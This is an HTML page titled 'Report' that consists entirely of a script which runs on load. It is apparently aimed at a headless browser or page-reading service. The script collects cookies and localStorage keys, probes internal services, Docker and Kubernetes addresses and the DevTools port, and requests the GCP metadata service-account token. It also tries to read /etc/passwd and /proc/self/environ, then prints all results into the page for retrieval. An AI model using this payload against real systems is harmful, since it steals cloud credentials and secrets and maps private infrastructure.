<html><head><title>Report</title></head><body><script>
var R={};
function p(k,v){R[k]=v;}
p("ua",navigator.userAgent);
p("href",window.location.href);
p("origin",window.location.origin);
p("protocol",window.location.protocol);
p("cookie",document.cookie||"none");
p("ls_keys",Object.keys(localStorage).join(",") || "empty");
var T=[
["redis_6379","http://redis:6379/"],
["searxng_8080","http://searxng:8080/"],
["browserless_3000","http://browserless:3000/json"],
["reader_3000","http://reader:3000/"],
["app_3000","http://app:3000/"],
["app_8000","http://app:8000/docs"],
["docker_gw","http://172.17.0.1:8080/"],
["docker_2","http://172.17.0.2:3000/json"],
["lo_3000","http://127.0.0.1:3000/json"],
["lo_8080","http://127.0.0.1:8080/"],
["lo_8000","http://127.0.0.1:8000/docs"],
["lo_9222","http://127.0.0.1:9222/json"],
["k8s_api","http://10.96.0.1:443/"],
["meta_v1","http://169.254.169.254/computeMetadata/v1/instance/hostname"]
];
var M=[
["gcp_token","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"],
["gcp_project","http://169.254.169.254/computeMetadata/v1/project/project-id"]
];
var F=["file:///etc/passwd","file:///etc/hostname","file:///proc/self/environ","file:///etc/resolv.conf"];
var done=0,total=T.length+M.length+F.length;
function chk(){done++;if(done>=total){document.title="SCAN DONE";document.body.textContent=JSON.stringify(R,null,2);}}
T.forEach(function(t){var c=new AbortController();var x=setTimeout(function(){c.abort();},3000);fetch(t[1],{mode:"no-cors",signal:c.signal}).then(function(r){clearTimeout(x);p(t[0],"REACH_"+r.type+"_"+r.status);chk();}).catch(function(e){clearTimeout(x);p(t[0],"ERR_"+e.name);chk();});});
M.forEach(function(t){var c=new AbortController();var x=setTimeout(function(){c.abort();},3000);fetch(t[1],{headers:{"Metadata-Flavor":"Google"},signal:c.signal}).then(function(r){clearTimeout(x);return r.text().then(function(b){p(t[0],"HTTP"+r.status+"_"+b.substring(0,200));chk();});}).catch(function(e){clearTimeout(x);p(t[0],"ERR_"+e.name);chk();});});
F.forEach(function(u){var n=u.replace("file:///","").replace(/\//g,"_");fetch(u).then(function(r){return r.text().then(function(b){p(n,"OK_"+b.substring(0,200));chk();});}).catch(function(e){p(n,"ERR_"+e.name);chk();});});
setTimeout(function(){document.body.textContent="TIMEOUT_RESULTS:"+JSON.stringify(R,null,2);},8000);
</script></body></html>
